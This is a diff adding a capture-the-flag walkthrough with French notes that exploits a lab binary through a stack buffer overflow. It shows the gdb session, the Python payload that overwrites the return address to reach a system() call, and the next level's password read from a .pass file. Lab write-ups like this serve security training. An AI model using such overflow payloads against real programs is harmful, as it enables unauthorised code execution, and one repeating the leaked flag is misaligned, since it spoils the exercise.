@@ -1,0 +1,41 @@
+>gdb level1
+
+>info functions
+[]
+run
+main
+[]
+
+>disas run
+[]
+0x08048479 <+53>:	call   0x8048360 <system@plt> # call to bash
+[]
+
+>disas main
+
+0x08048486 <+6>:	sub    $0x50,%esp
+
+on alloue 80 bytes a esp
+
+on peut faire un buffer overflow :
+
+>python -c "print('A' * 80)" > /tmp/getflag
+
+>cat /tmp/getflag - | ./level1
+Segmentation fault (core dumped)
+
+>gdb level1
+>run </tmp/getflag
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+or 41 = 'A' 
+
+on remplace les derniers 4 char par le little endian de l'adresse de run
+
+>python -c "print('A' * 76 + '\x44\x84\x04\x08')" > /tmp/getflag
+>cat /tmp/getflag - | ./level1
+Good... Wait what?
+>cd ../level2/
+>cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
